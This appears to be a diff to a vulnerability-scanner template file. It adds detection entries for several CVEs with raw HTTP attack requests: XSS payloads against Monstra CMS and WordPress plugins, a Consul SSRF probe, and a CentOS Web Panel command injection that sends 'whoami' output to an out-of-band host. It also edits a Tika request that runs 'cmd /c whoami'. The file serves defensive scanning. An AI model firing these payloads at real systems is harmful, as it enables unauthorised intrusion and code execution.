@@ -6536,6 +6536,20 @@
       ]
     },
     {
+      "id": "CVE-2018-11227",
+      "info": {
+        "name": "Monstra CMS V3.0.4 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /admin/index.php?id=pages HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlogin=\"><svg/onload=alert(document.domain)>&password=xxxxxx&login_submit=Log+In\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-11231",
       "info": {
         "name": "Opencart Divido - Sql Injection",
@@ -6561,6 +6575,21 @@
           "path": [
             "{{BaseURL}}/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json",
             "{{BaseURL}}/__raw/services/server/info/server-info?output_mode=json"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-11473",
+      "info": {
+        "name": "Monstra CMS V3.0.4 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /users/registration HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /users/registration HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ncsrf={{csrf}}&login=test&password=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&email=teest%40gmail.com&answer=test&register=Register\n"
           ]
         }
       ]
@@ -6816,11 +6845,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
             "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -19563,6 +19592,20 @@
       ]
     },
     {
+      "id": "CVE-2022-0234",
+      "info": {
+        "name": "WOOCS < 1.3.7.5 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /wp-admin/admin-ajax.php?action=woocs_get_products_price_html&woocs_in_order_currency=<img%20src%20onerror=alert(document.domain)> HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0271",
       "info": {
         "name": "LearnPress <4.1.6 - Cross-Site Scripting",
@@ -21987,6 +22030,20 @@
       ]
     },
     {
+      "id": "CVE-2022-29153",
+      "info": {
+        "name": "HashiCorp Consul/Enterprise - Server Side Request Forgery",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "PUT /v1/agent/check/register HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n \"id\": \"{{randstr}}\",\n \"name\": \"{{randstr}}\",\n \"method\": \"GET\",\n \"http\": \"/dev/null\",\n \"interval\": \"10s\",\n \"timeout\": \"1s\",\n \"disable_redirects\": true\n}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-29272",
       "info": {
         "name": "Nagios XI <5.8.5 - Open Redirect",
@@ -23403,7 +23460,7 @@
       "id": "CVE-2022-4260",
       "info": {
         "name": "WP-Ban < 1.69.1 - Admin Stored XSS",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -23547,6 +23604,20 @@
           "raw": [
             "POST /index.php?m=login&a=attemptLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
             "GET /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=</script><script>alert(document.domain)</script> HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-44877",
+      "info": {
+        "name": "Centos Web Panel - Unauthenticated Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}}) HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=root&password=toor&commit=Login\n"
           ]
         }
       ]
